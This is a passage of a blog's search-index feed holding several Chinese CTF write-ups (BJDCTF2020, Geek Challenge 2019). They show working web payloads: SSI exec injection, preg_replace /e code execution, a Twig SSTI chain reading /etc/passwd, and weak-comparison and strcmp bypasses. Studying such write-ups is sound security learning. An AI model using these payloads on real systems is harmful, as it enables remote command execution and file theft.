    <content type="html"><![CDATA[<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="Vim文件泄露-swp备份文件"><a href="#Vim文件泄露-swp备份文件" class="headerlink" title="Vim文件泄露(.swp备份文件)"></a>Vim文件泄露(.swp备份文件)</h2><p>进入index.php.swp发现index.php源码</p><pre><code class="hljs php+HTML">&lt;?phpob_start();function get_hash()&#123;$chars &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#39;;$random &#x3D; $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];&#x2F;&#x2F;Random 5 times$content &#x3D; uniqid().$random;return sha1($content); &#125;    header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);***    if(isset($_POST[&#39;username&#39;]) and $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; )    &#123;        $admin &#x3D; &#39;6d0bc1&#39;;        if ( $admin &#x3D;&#x3D; substr(md5($_POST[&#39;password&#39;]),0,6)) &#123;            echo &quot;&lt;script&gt;alert(&#39;[+] Welcome to manage system&#39;)&lt;&#x2F;script&gt;&quot;;            $file_shtml &#x3D; &quot;public&#x2F;&quot;.get_hash().&quot;.shtml&quot;;            $shtml &#x3D; fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);            $text &#x3D; &#39;            ***            ***            &lt;h1&gt;Hello,&#39;.$_POST[&#39;username&#39;].&#39;&lt;&#x2F;h1&gt;            ******&#39;;            fwrite($shtml,$text);            fclose($shtml);            ***echo &quot;[!] Header  error ...&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#39;[!] Failed&#39;)&lt;&#x2F;script&gt;&quot;;                &#125;else    &#123;***    &#125;***?&gt;</code></pre><h2 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$x</span>&lt;<span class="hljs-number">9999999</span>;<span class="hljs-variable">$x</span>++)&#123;<span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == substr(md5(<span class="hljs-variable">$x</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数字是：<span class="hljs-subst">$x</span> &lt;br&gt;&quot;</span>;    <span class="hljs-keyword">break</span>;&#125;&#125;<span class="hljs-comment">//2020666</span></code></pre><h2 id="shtml-联想到-SSI注入"><a href="#shtml-联想到-SSI注入" class="headerlink" title="shtml  联想到  SSI注入"></a>shtml  联想到  SSI注入</h2><p>参考链接：</p><p>​    <a href="https://www.zhangfangzhou.cn/apache-ssi-configuration.html">https://www.zhangfangzhou.cn/apache-ssi-configuration.html</a></p><p>payload:</p><p>​    <code>username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;&amp;password=2020666</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BJDCTF2020</tag>
      
      <tag>SSI注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[BJDCTF2020]ZJCTF，不过如此</title>
    <link href="/2020/02/05/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"/>
    <url>/2020/02/05/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="阅读代码-根据php为协议（input和file）读出next-php"><a href="#阅读代码-根据php为协议（input和file）读出next-php" class="headerlink" title="阅读代码 根据php为协议（input和file）读出next.php"></a>阅读代码 根据php为协议（input和file）读出next.php</h2><p><img src="https://s2.ax1x.com/2020/02/05/1sgLZR.png" alt="1sgLZR.png"></p><p>base64转码</p><pre><code class="hljs php+HTML">&lt;?php$id &#x3D; $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] &#x3D; $id;function complex($re, $str) &#123;    return preg_replace(        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );&#125;foreach($_GET as $re &#x3D;&gt; $str) &#123;    echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;@eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><h2 id="preg-replace-e-模式下的代码执行"><a href="#preg-replace-e-模式下的代码执行" class="headerlink" title="preg_replace /e 模式下的代码执行"></a><strong>preg_replace</strong> <strong>/e</strong> 模式下的代码执行</h2><p><strong>payload</strong> ： <strong>\S*=${phpinfo()}</strong></p><p>直接传入</p><p><img src="https://s2.ax1x.com/2020/02/05/1sRkX4.png" alt="1sRkX4.png"></p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>参考链接：</p><ol><li><p>PHP伪协议：</p><p><a href="https://www.freebuf.com/column/148886.html">https://www.freebuf.com/column/148886.html</a></p></li><li><p>preg_replace()</p><p><a href="https://xz.aliyun.com/t/2557#toc-0">https://xz.aliyun.com/t/2557#toc-0</a></p><p><a href="https://www.cnblogs.com/dhsx/p/4991983.html">https://www.cnblogs.com/dhsx/p/4991983.html</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BJDCTF2020</tag>
      
      <tag>preg_replace()</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[BJDCTF2020] Cookie is so stable</title>
    <link href="/2020/02/05/BJ/"/>
    <url>/2020/02/05/BJ/</url>
    
    <content type="html"><![CDATA[<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="判断为SSTI模板注入"><a href="#判断为SSTI模板注入" class="headerlink" title="判断为SSTI模板注入"></a>判断为SSTI模板注入</h2><p><img src="https://s2.ax1x.com/2020/02/05/1rBgIg.png" alt="image-20200205121452564"></p><p>判断SSTI可以依据这个进行测试</p><p><img src="https://s2.ax1x.com/2020/02/05/1roUnU.jpg" alt="1roUnU.jpg"></p><h2 id="根据上述测试构造Twig的payload"><a href="#根据上述测试构造Twig的payload" class="headerlink" title="根据上述测试构造Twig的payload"></a>根据上述测试构造Twig的payload</h2><pre><code class="hljs handlebars"><span class="xml">user=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /etc/passwd&quot;</span>)&#125;&#125;</span></code></pre><p><img src="https://s2.ax1x.com/2020/02/05/1r7sOK.png" alt="1r7sOK.png"></p><p>cat /flag 即可得到</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><p>参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p><p><a href="https://www.anquanke.com/post/id/188172#h2-4">https://www.anquanke.com/post/id/188172#h2-4</a></p><p><a href="https://xz.aliyun.com/t/3679#toc-0">https://xz.aliyun.com/t/3679#toc-0</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BJDCTF2020</tag>
      
      <tag>SSTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[极客大挑战 2019]  BuyFlag</title>
    <link href="/2020/02/04/%E7%AC%AC%E4%B8%80%E7%AF%87/"/>
    <url>/2020/02/04/%E7%AC%AC%E4%B8%80%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ol><li><p>Only Cuit’s students can buy the FLAG   </p><p>user=1时即可      涉及到用户的多往cookie想</p></li><li><p>Please input your password!!</p><p>传入404+任意字母就行       ==弱等于     </p><p>一些绕过    <a href="https://www.cnblogs.com/leixiao-/p/9786496.html">淚笑师傅的总结</a></p></li><li><p>Pay for the flag!!!hacker!!!</p><p>money有长度限制 可以用科学计数法 1e99</p><p>OR    数组绕过（strcmp()漏洞）</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>极客大挑战 2019</tag>
      
      <tag>strcmp()</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
